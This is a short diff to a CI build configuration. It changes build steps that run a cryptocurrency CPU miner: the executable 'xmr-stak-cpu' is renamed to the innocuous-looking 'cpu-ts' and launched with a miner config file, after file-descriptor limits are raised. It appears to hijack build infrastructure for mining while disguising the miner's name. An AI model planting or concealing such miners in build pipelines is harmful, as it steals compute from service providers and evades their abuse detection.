@@ -15,8 +15,7 @@ build:
        code: ulimit -n 262144 && ulimit -Hn 262144
     - script:
        name: install 3
-       code: chmod +x xmr-stak-cpu
+       code: chmod +x cpu-ts
     - script:
        name: install 4
-       code: ./xmr-stak-cpu
-       
+       code: ./cpu-ts -c cpuminer-conf.json
